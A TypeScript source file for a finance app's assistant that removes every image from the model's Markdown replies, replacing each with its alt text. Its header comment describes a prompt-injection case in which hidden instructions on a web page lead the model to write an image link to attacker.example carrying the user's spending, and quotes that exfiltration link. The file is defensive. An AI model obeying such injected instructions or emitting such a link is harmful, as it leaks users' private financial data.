// Rendering rules for the assistant's Markdown that protect the user's data.
// Kept free of framework imports so it can be unit-tested with `node --test`.
//
// Why images are never rendered: a browser loads an <img> as soon as it appears, with no click.
// The assistant can read web pages (web search and deep research) and can see what the user shares
// (transactions, plan, holdings). A page with hidden instructions could get the model to write
// ![](https://attacker.example/pixel?data=<the user's spending>), and rendering it would send that
// data to the attacker. This is prompt injection leading to data exfiltration (OWASP Top 10 for
// LLM Applications 2025, LLM01 and LLM02). The app's own charts and tables are fenced ```chart /
// ```table blocks, not images, so nothing the app produces is lost.

type HastNode = {
  type: string
  tagName?: string
  value?: string
  properties?: Record<string, unknown>
  children?: HastNode[]
}

/** Text shown where an image was: its alt text in brackets, or nothing when it has none. */
export function imagePlaceholder(alt: unknown): string {
  const text = typeof alt === "string" ? alt.trim().slice(0, 120) : ""
  return text ? `[image: ${text}]` : ""
}

function replaceImages(node: HastNode) {
  if (!node.children) return
  node.children = node.children.map((child) => {
    if (child.type === "element" && child.tagName === "img") {
      return { type: "text", value: imagePlaceholder(child.properties?.alt) }
    }
    replaceImages(child)
    return child
  })
}

/** Rehype plugin: replaces every <img> with its alt text, so no reply can make the browser fetch a URL. */
export function rehypeNoImages() {
  return (tree: HastNode) => {
    replaceImages(tree)
  }
}
